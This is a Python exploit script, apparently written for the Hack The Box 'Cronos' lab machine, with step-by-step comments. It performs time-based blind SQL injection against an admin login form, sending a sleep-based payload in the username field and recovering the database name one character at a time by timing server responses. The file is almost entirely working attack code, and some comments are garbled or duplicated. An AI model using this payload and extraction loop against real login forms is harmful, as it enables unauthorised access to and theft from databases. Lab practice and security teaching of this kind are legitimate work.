#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *
# Function to control the program output when Ctrl+C is executed.
def def_handler(sig, frame):
log.failure("Exiting")
sys.exit(1)

# definition of the function to be used when a Ctrl+C signal is produced
signal.signal(signal.SIGINT, def_handler)

# variable to store the victim URL
url = 'http://admin.cronos.htb/index.php'

# variable to tunnel BurpSuite queries
burp = {'http': 'http://127.0.0.1:8080'}

# variable to store the characters to be tested
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!ยก\/{}[]'
# variable to store the results
result = ''

# function to check the time it takes for the server to respond
def check(payload):
# variable that stores the data format for the requests
data_post = {
# the values are obtained by parsing a query made with Burp a value will be passed
# static value of 'test' for the password and the value of the payload (which will be # passed as an argument to the function).
# as an argument to the function) as the value of username.
'username': '%s' % payload,
'password': 'test'
}

# variable storing the current time value
time_start = time.time()
# variable that stores the content that will be sent as a request
# value defined in the url variable and the data defined in the data_post variable
# in the data_post variable
content = requests.post(url, data=data_post)
# variable that stores the time value at the end of the request
time_end = time.time()

# verification of whether the difference between the start and end time is greater than 5 seconds
if time_end - time_start > 5:
return 1

# variable to store the progress
p1 = log.progress("Database")
p2 = log.progress("Payload")

# first loop that loops through each character of the name
# with a predefined size of 10
for i in xrange(1, 10):
# nested loop that loops through each of the characters stored in the s variable
# in the variable s
for c in s:
# variable that will store the statement to be injected
# in this case we will use a "' or " so that it will be executed when the first instruction fails
# will check if the %d character of the database() database name string matches the %c character and if it matches the
# the %c character and if it matches it will wait 5 seconds. Being %d=i and %c=c
payload = "' or if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (i,c)
# we visualize the progress of the payload generation
p2.status("%s" % payload)
# check if the return of the check function is 1, which would mean that it has taken more than 5 seconds
if check(payload):
# add the character to the result variable
result += c
# we visualize the progress of the result generation process
p1.status("%s" % result)
break

# print the final result
log.info("Database: %s" % result)